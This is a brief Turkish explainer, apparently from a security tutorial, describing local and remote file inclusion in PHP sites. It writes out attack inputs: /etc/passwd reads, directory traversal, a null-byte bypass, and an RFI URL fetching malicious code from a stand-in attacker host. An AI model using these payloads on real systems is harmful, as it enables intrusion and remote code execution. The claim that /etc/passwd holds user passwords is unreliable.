Uygulamanın dışarıdan gelen bir dosya çağrısını kontrolsüz şekilde kabul etmesi durumudur. Bayağı tehlikelidir!

**1. LFI (Local File Inclusion):**
Sunucunun "kendi içindeki" hassas dosyaları okumaktır.
* Mantık: `site.com/index.php?page=hakkimizda` yerine `site.com/index.php?page=/etc/passwd` yazarak Linux sunucunun kullanıcı şifrelerini çalmak.
* Bypass taktikleri: *Directory Traversal* (`../../../../etc/passwd`) veya Null Byte (`%00`) eklemek.

**2. RFI (Remote File Inclusion):**
Sunucuya dışarıdan, saldırganın hazırladığı "kötü niyetli bir dosyayı" yükletip çalıştırmaktır. (Sistemde PHP'nin `allow_url_include` ayarı açık olmalıdır).
* Mantık: `site.com/index.php?page=http://hacker.com/zararli_kod.php`
* Sonucu: Sunucu direkt ele geçirilir (Remote Code Execution - RCE).